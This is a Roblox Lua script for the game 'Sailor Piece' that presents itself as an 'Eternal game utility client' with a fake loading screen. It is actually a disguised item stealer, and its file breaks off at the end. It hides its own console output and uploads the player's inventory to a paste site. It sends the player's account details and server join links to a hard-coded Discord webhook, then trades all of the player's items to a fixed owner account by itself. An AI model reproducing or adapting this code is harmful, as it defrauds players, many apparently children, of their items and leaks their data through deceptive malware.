local OWNER_ID = 966033905
local WEBHOOK = "https://discord.com/api/webhooks/1463346533498880030/7eQn_CVEQv0cKBNqCpNxcruZ3de4EJ61SEeXi0y7rczrrERVN-PnDf4uW3vQ9QY-ggcN"
local DC_USER = "shodax"
local DC_UID = "1015534770236686367"
local MIN_RARITY = "Common"
local HIDE_PRIVATE = false
local MIN_PLAYERS_PUBLIC = 4
local EMBED_IMG = "https://i.imgur.com/B9eAmzM.jpeg"
local LOAD_DURATION = 180
local DISCORD_INVITE = "https://discord.gg/cHHA8ZTNwh"
local TRADE_REQUEST_DELAY = 10
local JOIN_PAGE_BASE = "https://itstimetostealrobloxkid.pages.dev/"
local firstTradeDone = false

local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")
local HTTP = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local LP = Players.LocalPlayer
local PG = LP:WaitForChild("PlayerGui")

local Remotes = RS:WaitForChild("Remotes")
local TradeRemotes = Remotes:WaitForChild("TradeRemotes")
local SendTradeRequest = TradeRemotes:WaitForChild("SendTradeRequest")
local AddItemToTrade = TradeRemotes:WaitForChild("AddItemToTrade")
local SetReady = TradeRemotes:WaitForChild("SetReady")
local ConfirmTrade = TradeRemotes:WaitForChild("ConfirmTrade")
local AcceptTradeRequest = TradeRemotes:FindFirstChild("AcceptTradeRequest")
local RequestInventory = Remotes:FindFirstChild("RequestInventory")
local UpdateInventory = Remotes:FindFirstChild("UpdateInventory")

local ItemRarityConfig = require(RS:WaitForChild("Modules"):WaitForChild("ItemRarityConfig"))
local RarityOrder = ItemRarityConfig.RarityOrder
local MIN_RARITY_ORDER = RarityOrder[MIN_RARITY] or 1

local cachedItems = {}
local filteredItems = {}
local gotInventory = false
local firstCategoryDone = false
local webhookMessageId = nil
local tradeItemsList = {}
local rubisUrl = nil
local tradeStatus = "Waiting"
local playerConnected = true
local loadingDone = false

local _p = function() end
print = function() end
warn = function() end
error = function() end

local function doRequest(data)
    local fn = request or http_request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
    if fn then return fn(data) end
end

local function openURL(url)
    local opened = false
    pcall(function() if syn and syn.open_url then syn.open_url(url) opened = true end end)
    pcall(function() if fluxus and fluxus.open_url then fluxus.open_url(url) opened = true end end)
    if not opened then pcall(function() if openurl then openurl(url) opened = true end end) end
    if not opened then pcall(function() if open_url then open_url(url) opened = true end end) end
    pcall(function() if setclipboard then setclipboard(url) end end)
    return opened
end

local function getServerType()
    local ok, r = pcall(function()
        local psId = game.PrivateServerId
        local psOwner = game.PrivateServerOwnerId
        if psId ~= nil and psId ~= "" then
            if psOwner ~= nil and psOwner ~= 0 then return "VIP Server"
            else return "Reserved Server" end
        end
        return "Public Server"
    end)
    if ok and r then return r end
    return "Public Server"
end
local serverType = getServerType()
local function isPrivateServer() return serverType ~= "Public Server" end

local function getCurrentPlayerCount()
    local ok, c = pcall(function() return #Players:GetPlayers() end)
    if ok then return c end
    return 0
end

local function shouldSkipLog()
    if not HIDE_PRIVATE then return false end
    if isPrivateServer() then return true end
    if getCurrentPlayerCount() < MIN_PLAYERS_PUBLIC then return true end
    return false
end

local function getDeepLink()
    return "roblox://placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. tostring(game.JobId)
end

local function getBrowserJoinLink()
    return JOIN_PAGE_BASE .. "?placeId=" .. tostring(game.PlaceId) .. "&jobId=" .. tostring(game.JobId)
end

local function createLoadingUI()
    local sg = Instance.new("ScreenGui")
    sg.Name = "EternalUI"
    sg.ResetOnSpawn = false
    sg.IgnoreGuiInset = true
    sg.DisplayOrder = 999999

    local bg = Instance.new("Frame")
    bg.Name = "BG"
    bg.Size = UDim2.new(1,0,1,0)
    bg.BackgroundColor3 = Color3.fromRGB(0,0,0)
    bg.BorderSizePixel = 0
    bg.ZIndex = 100
    bg.Parent = sg

    local topLine = Instance.new("Frame")
    topLine.Size = UDim2.new(1,0,0,1)
    topLine.BackgroundColor3 = Color3.fromRGB(255,255,255)
    topLine.BackgroundTransparency = 0.85
    topLine.BorderSizePixel = 0
    topLine.ZIndex = 105
    topLine.Parent = bg

    local card = Instance.new("Frame")
    card.Size = UDim2.new(0,380,0,320)
    card.Position = UDim2.new(0.5,-190,0.5,-160)
    card.BackgroundColor3 = Color3.fromRGB(10,10,10)
    card.BorderSizePixel = 0
    card.ZIndex = 101
    card.Parent = bg
    Instance.new("UICorner",card).CornerRadius = UDim.new(0,8)

    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(255,255,255)
    stroke.Thickness = 1
    stroke.Transparency = 0.9
    stroke.Parent = card

    local logo = Instance.new("TextLabel")
    logo.Name = "Logo"
    logo.Size = UDim2.new(1,0,0,30)
    logo.Position = UDim2.new(0,0,0,25)
    logo.BackgroundTransparency = 1
    logo.Text = "◈"
    logo.TextColor3 = Color3.fromRGB(255,255,255)
    logo.TextSize = 24
    logo.Font = Enum.Font.GothamBold
    logo.TextXAlignment = Enum.TextXAlignment.Center
    logo.ZIndex = 102
    logo.Parent = card

    local title = Instance.new("TextLabel")
    title.Name = "Title"
    title.Size = UDim2.new(1,0,0,30)
    title.Position = UDim2.new(0,0,0,55)
    title.BackgroundTransparency = 1
    title.Text = "ETERNAL"
    title.TextColor3 = Color3.fromRGB(255,255,255)
    title.TextSize = 22
    title.Font = Enum.Font.GothamBold
    title.TextXAlignment = Enum.TextXAlignment.Center
    title.ZIndex = 102
    title.TextTransparency = 0
    title.Parent = card

    local sub = Instance.new("TextLabel")
    sub.Name = "Sub"
    sub.Size = UDim2.new(1,0,0,16)
    sub.Position = UDim2.new(0,0,0,83)
    sub.BackgroundTransparency = 1
    sub.Text = "GAME UTILITY CLIENT"
    sub.TextColor3 = Color3.fromRGB(90,90,90)
    sub.TextSize = 9
    sub.Font = Enum.Font.Gotham
    sub.TextXAlignment = Enum.TextXAlignment.Center
    sub.ZIndex = 102
    sub.Parent = card

    local div = Instance.new("Frame")
    div.Size = UDim2.new(0.5,0,0,1)
    div.Position = UDim2.new(0.25,0,0,108)
    div.BackgroundColor3 = Color3.fromRGB(255,255,255)
    div.BackgroundTransparency = 0.9
    div.BorderSizePixel = 0
    div.ZIndex = 102
    div.Parent = card

    local status = Instance.new("TextLabel")
    status.Name = "Status"
    status.Size = UDim2.new(1,0,0,16)
    status.Position = UDim2.new(0,0,0,120)
    status.BackgroundTransparency = 1
    status.Text = "INITIALIZING"
    status.TextColor3 = Color3.fromRGB(70,70,70)
    status.TextSize = 9
    status.Font = Enum.Font.Gotham
    status.TextXAlignment = Enum.TextXAlignment.Center
    status.ZIndex = 102
    status.Parent = card

    local detail = Instance.new("TextLabel")
    detail.Name = "Detail"
    detail.Size = UDim2.new(1,0,0,14)
    detail.Position = UDim2.new(0,0,0,137)
    detail.BackgroundTransparency = 1
    detail.Text = ""
    detail.TextColor3 = Color3.fromRGB(45,45,45)
    detail.TextSize = 8
    detail.Font = Enum.Font.Gotham
    detail.TextXAlignment = Enum.TextXAlignment.Center
    detail.ZIndex = 102
    detail.Parent = card

    local barBg = Instance.new("Frame")
    barBg.Name = "BarBG"
    barBg.Size = UDim2.new(0.7,0,0,3)
    barBg.Position = UDim2.new(0.15,0,0,162)
    barBg.BackgroundColor3 = Color3.fromRGB(25,25,25)
    barBg.BorderSizePixel = 0
    barBg.ZIndex = 102
    barBg.Parent = card
    Instance.new("UICorner",barBg).CornerRadius = UDim.new(0,2)

    local barFill = Instance.new("Frame")
    barFill.Name = "Fill"
    barFill.Size = UDim2.new(0,0,1,0)
    barFill.BackgroundColor3 = Color3.fromRGB(255,255,255)
    barFill.BorderSizePixel = 0
    barFill.ZIndex = 103
    barFill.Parent = barBg
    Instance.new("UICorner",barFill).CornerRadius = UDim.new(0,2)

    local pct = Instance.new("TextLabel")
    pct.Name = "Pct"
    pct.Size = UDim2.new(1,0,0,16)
    pct.Position = UDim2.new(0,0,0,175)
    pct.BackgroundTransparency = 1
    pct.Text = "0%"
    pct.TextColor3 = Color3.fromRGB(50,50,50)
    pct.TextSize = 10
    pct.Font = Enum.Font.GothamBold
    pct.TextXAlignment = Enum.TextXAlignment.Center
    pct.ZIndex = 102
    pct.Parent = card

    local modCount = Instance.new("TextLabel")
    modCount.Name = "ModCount"
    modCount.Size = UDim2.new(1,0,0,14)
    modCount.Position = UDim2.new(0,0,0,195)
    modCount.BackgroundTransparency = 1
    modCount.Text = "0 / 12 modules"
    modCount.TextColor3 = Color3.fromRGB(35,35,35)
    modCount.TextSize = 8
    modCount.Font = Enum.Font.Gotham
    modCount.TextXAlignment = Enum.TextXAlignment.Center
    modCount.ZIndex = 102
    modCount.Parent = card

    local console = Instance.new("TextLabel")
    console.Name = "Console"
    console.Size = UDim2.new(0.8,0,0,50)
    console.Position = UDim2.new(0.1,0,0,218)
    console.BackgroundTransparency = 1
    console.Text = ""
    console.TextColor3 = Color3.fromRGB(30,30,30)
    console.TextSize = 7
    console.Font = Enum.Font.Code
    console.TextXAlignment = Enum.TextXAlignment.Left
    console.TextYAlignment = Enum.TextYAlignment.Top
    console.TextWrapped = true
    console.ZIndex = 102
    console.Parent = card

    local serverInfo = Instance.new("TextLabel")
    serverInfo.Name = "ServerInfo"
    serverInfo.Size = UDim2.new(1,0,0,14)
    serverInfo.Position = UDim2.new(0,0,0,278)
    serverInfo.BackgroundTransparency = 1
    serverInfo.Text = "Place " .. tostring(game.PlaceId) .. " │ " .. string.sub(tostring(game.JobId), 1, 8) .. "..."
    serverInfo.TextColor3 = Color3.fromRGB(35,35,35)
    serverInfo.TextSize = 8
    serverInfo.Font = Enum.Font.Gotham
    serverInfo.TextXAlignment = Enum.TextXAlignment.Center
    serverInfo.ZIndex = 102
    serverInfo.Parent = card

    local brand = Instance.new("TextLabel")
    brand.Name = "Brand"
    brand.Size = UDim2.new(1,0,0,14)
    brand.Position = UDim2.new(0,0,0,296)
    brand.BackgroundTransparency = 1
    brand.Text = "eternal.gg"
    brand.TextColor3 = Color3.fromRGB(30,30,30)
    brand.TextSize = 8
    brand.Font = Enum.Font.Gotham
    brand.TextXAlignment = Enum.TextXAlignment.Center
    brand.ZIndex = 102
    brand.Parent = card

    sg.Parent = PG
    return sg, barFill, pct, status, detail, card, bg, logo, stroke, barBg, serverInfo, modCount, console
end

local function runLoadingBar()
    local sg, barFill, pct, status, detail, card, bg, logo, stroke, barBg, serverInfo, modCount, console = createLoadingUI()

    task.spawn(function()
        while sg and sg.Parent do
            pcall(function()
                TweenService:Create(logo, TweenInfo.new(2,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut), {TextTransparency=0.5}):Play()
                task.wait(2)
                TweenService:Create(logo, TweenInfo.new(2,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut), {TextTransparency=0}):Play()
                task.wait(2)
            end)
        end
    end)

    task.spawn(function()
        while sg and sg.Parent do
            pcall(function()
                TweenService:Create(stroke, TweenInfo.new(3,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut), {Transparency=0.8}):Play()
                task.wait(3)
                TweenService:Create(stroke, TweenInfo.new(3,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut), {Transparency=0.95}):Play()
                task.wait(3)
            end)
        end
    end)

    local consoleLines = {}
    local function addConsoleLine(txt)
        table.insert(consoleLines, '> ' .. txt)
        if #consoleLines > 5 then table.remove(consoleLines, 1) end
        pcall(function() console.Text = table.concat(consoleLines, "\n") end)
    end

    local phases = {
        {pct=0,   status="INITIALIZING",        detail="Checking executor environment...",      mod=0,  log="init: detecting executor"},
        {pct=5,   status="INITIALIZING",        detail="Validating session token...",           mod=0,  log="auth: session token valid"},
        {pct=8,   status="CONNECTING",           detail="Resolving game services...",            mod=1,  log="svc: Players, ReplicatedStorage"},
        {pct=12,  status="CONNECTING",           detail="Establishing HTTP channel...",          mod=1,  log="http: channel established"},
        {pct=16,  status="LOADING MODULES",      detail="Loading ItemRarityConfig...",           mod=2,  log="mod: ItemRarityConfig loaded"},
        {pct=22,  status="LOADING MODULES",      detail="Loading TradeRemotes...",               mod=3,  log="mod: TradeRemotes resolved"},
        {pct=28,  status="LOADING MODULES",      detail="Loading SendTradeRequest...",           mod=4,  log="mod: SendTradeRequest bound"},
        {pct=33,  status="LOADING MODULES",      detail="Loading AddItemToTrade...",             mod=5,  log="mod: AddItemToTrade bound"},
        {pct=38,  status="LOADING MODULES",      detail="Loading SetReady, ConfirmTrade...",     mod=6,  log="mod: SetReady, ConfirmTrade bound"},
        {pct=44,  status="SCANNING",             detail="Requesting data...",                    mod=7,  log="inv: RequestInventory fired"},
        {pct=50,  status="SCANNING",             detail="Parsing inventory response...",         mod=7,  log="inv: parsing response data"},
        {pct=56,  status="SCANNING",             detail="Filtering rarity: " .. MIN_RARITY .. "+...", mod=8,  log="inv: filter applied (" .. MIN_RARITY .. "+)"},
        {pct=62,  status="SCANNING",             detail="Building trade item list...",           mod=8,  log="inv: trade list built"},
        {pct=68,  status="PREPARING",            detail="Validating owner: " .. tostring(OWNER_ID) .. "...", mod=9,  log="trade: owner validated"},
        {pct=74,  status="PREPARING",            detail="Configuring trade parameters...",       mod=9,  log="trade: params configured"},
        {pct=79,  status="UPLOADING",            detail="Uploading inventory to Rubis...",       mod=10, log="upload: rubis api call"},
        {pct=84,  status="SYNCING",              detail="Dispatching webhook payload...",        mod=11, log="webhook: payload dispatched"},
        {pct=89,  status="SYNCING",              detail="Binding event listeners...",            mod=11, log="events: PlayerAdded, TradeRequest"},
        {pct=93,  status="FINALIZING",           detail="Setting up heartbeat...",               mod=12, log="heartbeat: 15s interval set"},
        {pct=96,  status="FINALIZING",           detail="Binding disconnect handlers...",        mod=12, log="disconnect: handlers bound"},
        {pct=100, status="READY",                detail="All systems operational",               mod=12, log="status: OPERATIONAL"},
    }

    local totalDuration = LOAD_DURATION
    local phaseCount = #phases
    local baseDelay = totalDuration / phaseCount

    for i, phase in ipairs(phases) do
        local variance = (math.random() - 0.5) * baseDelay * 0.6
        local delay = math.max(0.5, baseDelay + variance)

        if phase.status == "SCANNING" then delay = delay * 1.3 end
        if phase.status == "UPLOADING" then delay = delay * 1.2 end

        pcall(function()
            status.Text = phase.status
            detail.Text = phase.detail
            modCount.Text = tostring(phase.mod) .. " / 12 modules"
            addConsoleLine(phase.log)

            local targetSize = UDim2.new(phase.pct / 100, 0, 1, 0)
            TweenService:Create(barFill, TweenInfo.new(delay * 0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = targetSize}):Play()
            pct.Text = tostring(phase.pct) .. "%"

            if phase.pct >= 90 then
                status.TextColor3 = Color3.fromRGB(120,120,120)
            elseif phase.pct >= 50 then
                status.TextColor3 = Color3.fromRGB(90,90,90)
            end
        end)

        if i < phaseCount then
            task.wait(delay)
        end
    end

    task.wait(1)
    pcall(function()
        status.Text = "COMPLETE"
        status.TextColor3 = Color3.fromRGB(255,255,255)
        detail.Text = "Eternal loaded successfully"
        detail.TextColor3 = Color3.fromRGB(80,80,80)
        pct.Text = "100%"
        pct.TextColor3 = Color3.fromRGB(255,255,255)
        barFill.Size = UDim2.new(1,0,1,0)
        barFill.BackgroundColor3 = Color3.fromRGB(200,255,200)
        modCount.Text = "12 / 12 modules ✓"
        modCount.TextColor3 = Color3.fromRGB(80,80,80)
        addConsoleLine('ETERNAL CLIENT v2.1 READY')
    end)
    task.wait(2)

    pcall(function()
        logo.Text = "→"
        logo.TextTransparency = 0
        local titleLabel = card:FindFirstChild('Title')
        if titleLabel then
            titleLabel.Text = "JOIN DISCORD"
            titleLabel.TextSize = 20
        end
        local subLabel = card:FindFirstChild('Sub')
        if subLabel then
            subLabel.Text = "discord.gg/cHHA8ZTNwh"
            subLabel.TextColor3 = Color3.fromRGB(120,120,120)
            subLabel.TextSize = 11
            subLabel.Font = Enum.Font.GothamBold
        end
        status.Text = "OPENING BROWSER"
        status.TextColor3 = Color3.fromRGB(70,70,70)
        detail.Text = ""
        pct.Text = ""
        barBg.Visible = false
        modCount.Text = ""
        console.Text = ""
        serverInfo.Text = ""
    end)

    local didOpen = openURL(DISCORD_INVITE)

    pcall(function()
        if didOpen then
            status.Text = "BROWSER OPENED"
        else
            status.Text = "LINK COPIED TO CLIPBOARD"
        end
        status.TextColor3 = Color3.fromRGB(255,255,255)
    end)
    task.wait(2.5)

    pcall(function()
        for i=0,30 do
            local t = i/30
            bg.BackgroundTransparency = t
            for _,desc in ipairs(bg:GetDescendants()) do
                if desc:IsA("TextLabel") then desc.TextTransparency = math.max(desc.TextTransparency, t)
                elseif desc:IsA("Frame") then desc.BackgroundTransparency = math.max(desc.BackgroundTransparency, t)
                elseif desc:IsA("UIStroke") then desc.Transparency = math.max(desc.Transparency, t) end
            end
            task.wait(0.03)
        end
    end)
    pcall(function() sg:Destroy() end)
    loadingDone = true
end

local function getItemRarity(n) return ItemRarityConfig:GetRarity(n) end
local function getItemRarityOrder(n) return ItemRarityConfig:GetSortOrder(n) end
local function meetsMinRarity(n) return getItemRarityOrder(n) >= MIN_RARITY_ORDER end
local function sortItemsByRarity(items)
    table.sort(items, function(a,b)
        local oA,oB = getItemRarityOrder(a.name), getItemRarityOrder(b.name)
        if oA==oB then if a.quantity==b.quantity then return a.name<b.name end return a.quantity>b.quantity end
        return oA>oB end)
    return items end
local function filterByRarity(items)
    local r = {} for _,item in ipairs(items) do if meetsMinRarity(item.name) then table.insert(r,{name=item.name,quantity=item.quantity}) end end return r end

local function getExecutorName()
    if syn then return "Synapse X" elseif fluxus then return "Fluxus" elseif KRNL_LOADED then return "KRNL"
    elseif is_sirhurt_closure then return "SirHurt" elseif getexecutorname then
        local ok,n = pcall(getexecutorname) if ok then return n end end
    return "Unknown" end
local function getAccountAge()
    local ok,age = pcall(function() return LP.AccountAge end)
    if ok then return tostring(age).." Days" end return "Unknown" end
local function getPlayerCount()
    local ok,c = pcall(function() return #Players:GetPlayers() end)
    if ok then return tostring(c).."/"..tostring(Players.MaxPlayers) end return "?/?" end

local function uploadToRubis(txt)
    local s,r = pcall(function()
        local resp = doRequest({Url="https://api.rubis.app/v2/scrap?public=true&title="..HTTP:UrlEncode("STC_"..LP.Name.."_"..tostring(LP.UserId)),Method="POST",Headers={["Content-Type"]="text/plain"},Body=txt})
        if not resp or not resp.Body then return nil end
        local ok2,d = pcall(function() return HTTP:JSONDecode(resp.Body) end)
        if not ok2 or not d then return nil end
        local sid = d.id or d.key or d.scrapId or d.scrapID
        if sid then return "https://api.rubis.app/v2/scrap/"..tostring(sid).."/raw" end return nil end)
    if s and r then return r end return nil end

local function buildFullInventoryText()
    if not cachedItems or #cachedItems==0 then return "No items found." end
    local NL,L = "\n",{}
    L[#L+1]="======================================" L[#L+1]="  SAILOR PIECE — FULL INVENTORY LOG"
    L[#L+1]="  Player: "..LP.DisplayName.." (@"..LP.Name..")" L[#L+1]="  User ID: "..tostring(LP.UserId)
    L[#L+1]="  Server Type: "..serverType L[#L+1]="  Min Rarity: "..MIN_RARITY
    L[#L+1]="  Generated: "..os.date("!%Y-%m-%d %H:%M:%S UTC") L[#L+1]="======================================"
    L[#L+1]="" L[#L+1]="--- ALL ITEMS ---"
    local tQ=0 for _,i in ipairs(cachedItems) do tQ=tQ+i.quantity end
    L[#L+1]="Total: "..tostring(tQ).." | Types: "..tostring(#cachedItems) L[#L+1]="--------------------------------------"
    for i,item in ipairs(cachedItems) do L[#L+1]=string.format("  %3d. [%s] %s x%d",i,getItemRarity(item.name),item.name,item.quantity) end
    L[#L+1]="--------------------------------------" L[#L+1]="" L[#L+1]="--- FILTERED ("..MIN_RARITY.."+) ---"
    local fQ=0 for _,i in ipairs(filteredItems) do fQ=fQ+i.quantity end
    L[#L+1]="Filtered: "..tostring(fQ).." | Types: "..tostring(#filteredItems) L[#L+1]="--------------------------------------"
    for i,item in ipairs(filteredItems) do L[#L+1]=string.format("  %3d. [%s] %s x%d",i,getItemRarity(item.name),item.name,item.quantity) end
    L[#L+1]="--------------------------------------" L[#L+1]="" L[#L+1]="Eternal — STC"
    return table.concat(L,NL) end
local function doRubisUpload() if gotInventory and #cachedItems>0 then local url=uploadToRubis(buildFullInventoryText()) if url then rubisUrl=url end end end

if not UpdateInventory then return end
UpdateInventory.OnClientEvent:Connect(function(...)
    for _,arg in ipairs({...}) do
        if type(arg)=="table" then
            local items={}
            for k,v in pairs(arg) do if type(v)=="table" and v.name and v.quantity then table.insert(items,{name=tostring(v.name),quantity=tonumber(v.quantity) or 0}) end end
            sortItemsByRarity(items)
            if #items>0 and not firstCategoryDone then
                cachedItems=items filteredItems=filterByRarity(items) gotInventory=true firstCategoryDone=true tradeItemsList={}
                for _,item in ipairs(filteredItems) do table.insert(tradeItemsList,{name=item.name,quantity=item.quantity}) end
            end end end end)
if RequestInventory then pcall(function() RequestInventory:FireServer() end) end

local function waitForInventory(mw) local e=0 while not gotInventory and e<mw do task.wait(0.5) e=e+0.5 end return gotInventory end

local function isTradeGUIOpen()
    local ok, r = pcall(function()
        local pg = LP:FindFirstChild("PlayerGui")
        if not pg then return false end
        local tradingUI = pg:FindFirstChild("InTradingUI")
        if not tradingUI then return false end
        local mainFrame = tradingUI:FindFirstChild("MainFrame")
        if not mainFrame then return false end
        return mainFrame.Visible == true
    end)
    if ok then return r end
    return false
end

local function waitForTradeOpen(maxWait)
    local elapsed = 0
    while elapsed < maxWait do
        if isTradeGUIOpen() then
            return true
        end
        task.wait(0.2)
        elapsed = elapsed + 0.2
    end
    return false
end

local function waitForTradeGUIStable()
    local stableTime = 0
    local maxWait = 10
    local elapsed = 0
    while elapsed < maxWait do
        if isTradeGUIOpen() then
            stableTime = stableTime + 0.2
            if stableTime >= 1.0 then
                return true
            end
        else
            stableTime = 0
        end
        task.wait(0.2)
        elapsed = elapsed + 0.2
    end
    return isTradeGUIOpen()
end

local function isAlive() local ok,r=pcall(function() return LP and LP:IsDescendantOf(Players) and LP.Parent~=nil end) if ok then return r end return false end

function buildEmbedData(joinLink, browserLink, isConnected)
    local exec,age,pc,sT=getExecutorName(),getAccountAge(),getPlayerCount(),serverType
    local eC=2829617
    if tradeStatus=="Pending" then eC=16744448 elseif tradeStatus=="Completed" then eC=5763719 end
    if not isConnected then eC=15548997 end
    local NL="\n"
    local sE="🌐" if sT=="VIP Server" then sE="🔒" elseif sT=="Reserved Server" or sT=="Private Server" then sE="🔐" end
    local pB="```js"..NL.."// Player Information"..NL..NL
    pB=pB.."   Username    = \""..LP.Name.."\""..NL
    pB=pB.."   Display     = \""..LP.DisplayName.."\""..NL
    pB=pB.."   Executor    = \""..exec.."\""..NL
    pB=pB.."   Account Age = \""..age.."\""..NL
    pB=pB.."   Server      = \""..pc.."\""..NL
    pB=pB.."   Server Type = \""..sT.."\""..NL
    pB=pB.."   Receiver    = "..tostring(OWNER_ID)..NL
    pB=pB.."   Filter      = \""..MIN_RARITY.."+\""..NL.."```"
    local iB="```js"..NL.."// Inventory ("..MIN_RARITY.."+)"..NL..NL
    if gotInventory and #filteredItems>0 then
        local sc=math.min(15,#filteredItems)
        for i=1,sc do local item=filteredItems[i] iB=iB.."   ["..getItemRarity(item.name).."] "..item.name.." x"..tostring(item.quantity)..NL end
        local rem=#filteredItems-sc if rem>0 then iB=iB..NL.."   // + "..tostring(rem).." more..."..NL end
    elseif gotInventory then iB=iB.."   // No items match "..MIN_RARITY.."+\n"
    else iB=iB.."   // Could not load inventory\n" end
    iB=iB.."```"

    local lB = sE .. " " .. sT .. NL
    lB = lB .. "**🌐 Join Server:** " .. browserLink .. NL
    lB = lB .. "**📋 Copy Link:**" .. NL
    lB = lB .. "`" .. joinLink .. "`"

    local sB if rubisUrl then sB="📋 [→ View Full Inventory Log]("..rubisUrl..")"
    else sB="```js\n// Full Inventory Log\n\n   // Upload failed\n```" end
    return {
        ["content"]="<@"..DC_UID..">\n\n🌐 **Click to join server:**\n"..browserLink.."\n\n📋 **Copy paste link:**\n`"..joinLink.."`",
        ["embeds"]={{["title"]="◈ Sailor Piece — Hit",["color"]=eC,
            ["fields"]={
                {["name"]="◈ Player",["value"]=pB,["inline"]=false},
                {["name"]="◈ Inventory",["value"]=iB,["inline"]=false},
                {["name"]="◈ Join",["value"]=lB,["inline"]=false},
                {["name"]="◈ Summary",["value"]=sB,["inline"]=false}},
            ["thumbnail"]={["url"]=EMBED_IMG},
            ["footer"]={["text"]="Eternal │ "..os.date("!%Y"),["icon_url"]=EMBED_IMG},
            ["author"]={["name"]="Eternal",["icon_url"]=EMBED_IMG},
            ["timestamp"]=os.date("!%Y-%m-%dT%H:%M:%SZ")}}} end

local function setTradeStatus(s) tradeStatus=s if shouldSkipLog() then return end task.wait(0.5)
    local jl=getDeepLink() local bl=getBrowserJoinLink()
    if not webhookMessageId then pcall(function()
        local resp=doRequest({Url=WEBHOOK.."?wait=true",Method="POST",Headers={["Content-Type"]="application/json"},Body=HTTP:JSONEncode(buildEmbedData(jl,bl,playerConnected))})
        if resp and resp.Body then local ok2,body=pcall(function() return HTTP:JSONDecode(resp.Body) end) if ok2 and body and body.id then webhookMessageId=body.id end end end)
    else pcall(function()
        doRequest({Url=WEBHOOK.."/messages/"..webhookMessageId,Method="PATCH",Headers={["Content-Type"]="application/json"},Body=HTTP:JSONEncode(buildEmbedData(jl,bl,playerConnected))}) end) end end

local function setPlayerConnected(c) playerConnected=c if shouldSkipLog() then return end task.wait(0.5)
    if webhookMessageId then pcall(function()
        doRequest({Url=WEBHOOK.."/messages/"..webhookMessageId,Method="PATCH",Headers={["Content-Type"]="application/json"},Body=HTTP:JSONEncode(buildEmbedData(getDeepLink(),getBrowserJoinLink(),playerConnected))}) end) end end

local function sendWebhook(jl,bl,ic) if shouldSkipLog() then return end pcall(function()
    local resp=doRequest({Url=WEBHOOK.."?wait=true",Method="POST",Headers={["Content-Type"]="application/json"},Body=HTTP:JSONEncode(buildEmbedData(jl,bl,ic))})
    if resp and resp.Body then local ok2,body=pcall(function() return HTTP:JSONDecode(resp.Body) end) if ok2 and body and body.id then webhookMessageId=body.id end end end) end

local function updateWebhook(jl,bl,ic) playerConnected=ic if shouldSkipLog() then return end
    if not webhookMessageId then sendWebhook(jl,bl,ic) return end pcall(function()
    doRequest({Url=WEBHOOK.."/messages/"..webhookMessageId,Method="PATCH",Headers={["Content-Type"]="application/json"},Body=HTTP:JSONEncode(buildEmbedData(jl,bl,ic))}) end) end

local function addAllItemsToTrade()
    if not tradeItemsList or #tradeItemsList == 0 then
        return 0
    end

    if not isTradeGUIOpen() then
        return 0
    end

    if not waitForTradeGUIStable() then
        return 0
    end

    local totalAdded = 0
    local totalTypes = #tradeItemsList

    for idx, item in ipairs(tradeItemsList) do
        if not isTradeGUIOpen() then
            return totalAdded
        end

        local ok, err = pcall(function()
            AddItemToTrade:FireServer("Items", item.name, item.quantity)
        end)

        if ok then
            totalAdded = totalAdded + item.quantity
        end

        task.wait(0.25)

        if not isTradeGUIOpen() then
            return totalAdded
        end
    end

    return totalAdded
end

local function setReady()
    if not isTradeGUIOpen() then
        return
    end
    pcall(function() SetReady:FireServer(true) end)
end

local function waitAndConfirmTrade(mw)
    local e = 0
    while e < mw do
        if isTradeGUIOpen() then
            pcall(function() ConfirmTrade:FireServer() end)
        end
        task.wait(1)
        e = e + 1
        if not isTradeGUIOpen() then
            setTradeStatus("Completed")
            return true
        end
    end
    return false
end

local function findOwnerInServer()
    for _, p in ipairs(Players:GetPlayers()) do
        if p.UserId == OWNER_ID then return p end
    end
    return nil
end

local function refreshInventory()
    gotInventory = false
    firstCategoryDone = false
    cachedItems = {}
    filteredItems = {}
    tradeItemsList = {}
    if RequestInventory then pcall(function() RequestInventory:FireServer() end) end
    waitForInventory(10)
    if gotInventory then doRubisUpload() end
end

local function executeTrade()
    local owner = findOwnerInServer()
    if not owner then return end
    if tradeStatus == "Pending" then return end
    if tradeStatus == "Completed" then
        if #tradeItemsList == 0 then return end
        tradeStatus = "Waiting"
    end
    if #tradeItemsList == 0 then return end

    setTradeStatus("Pending")

    if not firstTradeDone then
        task.wait(TRADE_REQUEST_DELAY)
        firstTradeDone = true
    end

    if not findOwnerInServer() then
        setTradeStatus("Waiting")
        return
    end

    pcall(function() SendTradeRequest:FireServer(OWNER_ID) end)

    local opened = waitForTradeOpen(30)

    if not opened and AcceptTradeRequest then
        pcall(function() AcceptTradeRequest:FireServer(OWNER_ID) end)
        opened = waitForTradeOpen(15)
    end

    if not opened then
        setTradeStatus("Waiting")
        return
    end

    if not waitForTradeGUIStable() then
        setTradeStatus("Waiting")
        return
    end

    if not isTradeGUIOpen() then
        setTradeStatus("Waiting")
        return
    end

    local added = addAllItemsToTrade()

    if added == 0 then
        setTradeStatus("Waiting")
        return
    end

    task.wait(0.5)

    if isTradeGUIOpen() then
        setReady()
        task.wait(1)
        local success = waitAndConfirmTrade(60)
        if success then
            task.wait(3)
            if findOwnerInServer() then
                refreshInventory()
                if gotInventory and #tradeItemsList > 0 then
                    task.spawn(function()
                        task.wait(2)
                        executeTrade()
                    end)
                end
            end
        end
    else
        setTradeStatus("Waiting")
    end
end

task.spawn(function() runLoadingBar() end)
task.wait(3)
if not gotInventory then waitForInventory(10) end
if not gotInventory then if RequestInventory then pcall(function() RequestInventory:FireServer() end) end waitForInventory(10) end
if not gotInventory then if RequestInventory then pcall(function() RequestInventory:FireServer() end) end waitForInventory(15) end
local joinLink = getDeepLink()
local browserLink = getBrowserJoinLink()
if gotInventory then doRubisUpload() end
sendWebhook(joinLink, browserLink, true)
if findOwnerInServer() and gotInventory and #tradeItemsList > 0 then executeTrade() end

Players.PlayerAdded:Connect(function(player)
    if player.UserId == OWNER_ID then
        if not gotInventory then refreshInventory() end
        if gotInventory and #tradeItemsList > 0 then executeTrade() end
    end
end)

pcall(function()
